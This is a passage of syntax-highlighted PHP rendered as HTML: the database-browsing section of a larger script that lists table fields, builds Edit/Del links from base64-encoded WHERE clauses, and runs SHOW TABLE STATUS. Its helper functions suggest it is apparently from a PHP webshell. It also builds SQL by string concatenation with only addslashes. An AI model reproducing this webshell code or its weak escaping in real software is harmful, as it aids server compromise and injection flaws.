#99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">rowdb<\/span>[$<span style=\"color: #ffcc66;\">key<\/span>][<span style=\"color: #66cccc;\">'Key'<\/span>] == <span style=\"color: #66cccc;\">'UNI'<\/span><span style=\"text-decoration: underline;\"> || $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">key<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Extra'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'auto_increment'<\/span><span style=\"text-decoration: underline;\"> || $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">key<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'PRI'<\/span><span style=\"text-decoration: underline;\">) {<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = $<span style=\"color: #ffcc66;\">key<\/span>.<span style=\"color: #66cccc;\">\"='\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">addslashe<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">s(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">inside<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"'\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">break<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> .= $<span style=\"color: #ffcc66;\">tmp<\/span><span style=\"color: #f2777a; font-weight: bold;\">.<\/span>$<span style=\"color: #ffcc66;\">key<\/span>.<span style=\"color: #66cccc;\">\"='\"<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">addslas<\/span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">hes(<\/span><span style=\"text-decoration: underline;\">$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">inside<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"'\"<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tmp<\/span> = <span style=\"color: #66cccc;\">' AND '<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">\/\/<\/span><span style=\"color: #999999; font-style: italic;\">&#35835;&#21462;&#35760;&#24405;&#29992;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">foreach<\/span>($<span style=\"color: #ffcc66;\">mn<\/span> <span style=\"color: #99cc99;\">as<\/span> $<span style=\"color: #ffcc66;\">key<\/span>=&gt;$<span style=\"color: #ffcc66;\">inside<\/span>){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">b1<\/span> .= <span style=\"color: #66cccc;\">'&lt;td nowrap&gt;'<\/span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">html_clean(<\/span>$<span style=\"color: #ffcc66;\">ins<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">ide<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&amp;nbsp;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">where<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">base64_encode(<\/span>$<span style=\"color: #ffcc66;\">where<\/span>);\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">allowedit<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td nowrap&gt;&lt;a href=\"j<\/span><span style=\"color: #66cccc; text-decoration: underline;\">avascript:editrecord(\\'edit\\', \\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">where<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Edit&lt;\/a&gt; | &lt;a href=\"javascript:editrecord(\\'del\\', \\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">where<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\', \\''<\/span><span style=\"text-decoration: underline;\">.$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">tablename<\/span><span style=\"text-decoration: underline;\">.<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'\\');\"&gt;Del&lt;\/a&gt;&lt;\/td&gt;'<\/span><span style=\"text-decoration: underline;\">);<\/span>\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">b1<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">unset(<\/span>$<span style=\"color: #ffcc66;\">b1<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;tr class=\"head\"&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">if<\/span> ($<span style=\"color: #ffcc66;\">allowedit<\/span>) <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;td&gt;Action&lt;\/td&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">fieldnum<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_num_fields(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span>($<span style=\"color: #ffcc66;\">i<\/span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>&lt;$<span style=\"color: #ffcc66;\">fieldnum<\/span>;$<span style=\"color: #ffcc66;\">i<\/span>++){\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">name<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_name(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">type<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_type(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">len<\/span> = @<span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_field_len(<\/span>$<span style=\"color: #ffcc66;\">result<\/span>, $<span style=\"color: #ffcc66;\">i<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">\"&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"<\/span><span style=\"text-decoration: underline;\">.(($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'UNI'<\/span><span style=\"text-decoration: underline;\"> || $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Key'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'PRI'<\/span><span style=\"text-decoration: underline;\">) ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;b&gt; - PRIMARY&lt;\/b&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).($<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">rowdb<\/span><span style=\"text-decoration: underline;\">[$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">name<\/span><span style=\"text-decoration: underline;\">][<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'Extra'<\/span><span style=\"text-decoration: underline;\">] == <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'auto_increment'<\/span><span style=\"text-decoration: underline;\"> ? <\/span><span style=\"color: #66cccc; text-decoration: underline;\">'&lt;b&gt; - Auto&lt;\/b&gt;'<\/span><span style=\"text-decoration: underline;\"> : <\/span><span style=\"color: #66cccc; text-decoration: underline;\">''<\/span><span style=\"text-decoration: underline;\">).<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"&lt;\/span&gt;&lt;\/td&gt;\"<\/span><span style=\"text-decoration: underline;\">);<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;\/tr&gt;'<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">tbfoot(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span>$<span style=\"color: #ffcc66;\">multipage<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">break<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">case<\/span> <span style=\"color: #6699cc;\">2<\/span>:\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">ar<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_affected_rows(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">p(<\/span><span style=\"color: #66cccc;\">'&lt;h2&gt;affected rows : &lt;b&gt;'<\/span>.$<span style=\"color: #ffcc66;\">ar<\/span>.<span style=\"color: #66cccc;\">'&lt;\/b&gt;&lt;\/h2&gt;'<\/span>)<span style=\"text-decoration: underline;\">;<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">break<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   }\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   } <span style=\"color: #99cc99;\">else<\/span> {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">query<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">q(<\/span><span style=\"color: #66cccc;\">\"SHOW TABLE STATUS\"<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">table_num<\/span> = $<span style=\"color: #ffcc66;\">table_rows<\/span> = $<span style=\"color: #ffcc66;\">data_size<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">0<\/span>;\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">tabledb<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">array(<\/span>);\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">while<\/span>($<span style=\"color: #ffcc66;\">table<\/span> = <span style=\"color: #cccccc; background-color: #2d2d2d;\">mysql_fetch_array(<\/span>$<span style=\"color: #ffcc66;\">query<\/span>)) {\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">data_size<\/span> = $<span style=\"color: #ffcc66;\">data_size<\/span> + $<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Data_length'<\/span>];\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   $<span style=\"color: #ffcc66;\">table_rows<\/span> = $<span style=\"color: #ffcc66;\">table_rows<\/span> + $<span style=\"color: #ffcc66;\">table<\/span>[<span style=\"color: #66cccc;\">'Rows'<\/span>];\n<span style=\"background-color: #515151;\"> 